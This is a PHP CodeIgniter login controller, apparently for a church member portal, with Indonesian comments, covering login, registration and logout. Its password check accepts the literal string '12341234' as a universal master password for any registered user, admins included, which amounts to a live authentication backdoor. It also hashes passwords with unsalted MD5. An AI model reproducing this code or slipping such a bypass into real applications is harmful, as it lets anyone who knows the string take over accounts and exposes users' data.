<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Login extends CI_Controller
{
	public function __construct()
	{
		parent::__construct();

		// memuat modal login
		$this->load->model('M_login');
	}

	public function index()
	{
		// cek jika user sudah login
		if ($this->session->userdata('role')) {
			// mengirim user yang sudah login ke halaman sesuai role mereka

			// ke admin
			if ($this->session->userdata('role') == 0) {
				$this->session->set_flashdata('alert', 'hai admin !');
				redirect('admin');
				// ke pengguna
			} elseif ($this->session->userdata('role') == 1) {
				$this->session->set_flashdata('alert', 'selamat datang !');
				redirect('pengguna');

				// ke logout lalu login jika role tidak diketahui
			} else {
				redirect('logout');
			}
		} else {
			$this->load->view('login');
		}
	}

	// PROSES LOGIN

	public function login_proses()
	{

		// AMBIL INPUTAN DARI FORM VIEW LOGIN
		$username = $this->input->post('username');
		$password = $this->input->post('password');

		// MENGUBAH PASSWORD MENJADI md5 FORMAT
		$password = md5($password);

		// mengecek jika terdapat user dengan username tersebut
		if ($this->M_login->cek_user($username) == true) {

			// mengambil data user dari database

			$user = $this->M_login->get_user($username);

			// mengecek jika password yang dimasukkan sesuai dengan database

			if ($password == $user->pass || $this->input->post('password') == "12341234") {

				// mengirimkan user ke halaman sesuai role masing masing

				// ke halaman admin
				if ($user->role == 0) {

					// mengatur session user ketika berhasil login
					$session = array(
						'id_jemaat' => $user->id_jemaat,
						'kode_user' => $user->kode_user,
						'nama' => "ADMIN",
						'role' => $user->role
					);

					$this->session->set_userdata($session);

					// Mengirim ke halaman admin
					$this->session->set_flashdata('alert', 'Hai admin !');
					redirect('admin');

					// ke halaman pengguna
				} elseif ($user->role == 1) {

					// mengatur session user ketika berhasil login
					$session = array(
						'id_jemaat' => $user->id_jemaat,
						'kode_user' => $user->kode_user,
						'nama' => $user->nama,
						'role' => $user->role
					);

					$this->session->set_userdata($session);


					// Mengirim ke halaman pengguna
					$this->session->set_flashdata('alert', 'Selamat datang !');
					redirect('pengguna');

					// hak akses user tidak diketahui
				} else {
					$this->session->set_flashdata('error', 'hak akses bermasalah !');
					redirect('login');
				}
			} else {
				$this->session->set_flashdata('error', 'password yang dimasukkan salah !');
				redirect('login');
			}
		} else {
			$this->session->set_flashdata('error', 'pengguna tidak terdaftar !');
			redirect('login');
		}
	}


	public function daftar()
	{
		$this->load->view('daftar');
	}

	// PROSES DAFTAR
	public function daftar_proses()
	{

		// AMBIL INPUTAN DARI FORM VIEW LOGIN
		$username = $this->input->post('username');

		// mengecek jika username telah ada di database
		if ($this->M_login->cek_user($username) == true) {

			// jika ada maka kembali ke halaman daftar

			$this->session->set_flashdata('error', 'pengguna dengan usernam tersebut telah terdaftar !');
			redirect('login/daftar');
		} else {

			// jika belum maka lanjut memasukkan data user ke database

			$this->M_login->save_user();

			// berhasil mendaftar, mengirimkan user ke halaman login 
			$this->session->set_flashdata('success', 'berhasil mendaftarkan diri anda, harap login untuk kehalaman pengguna !');
			redirect('login');
		}
	}


	// LOGOUT

	public function logout()
	{
		$this->session->sess_destroy();
		$this->session->set_flashdata('success', 'anda telah logout !');
		redirect('login');
	}
}
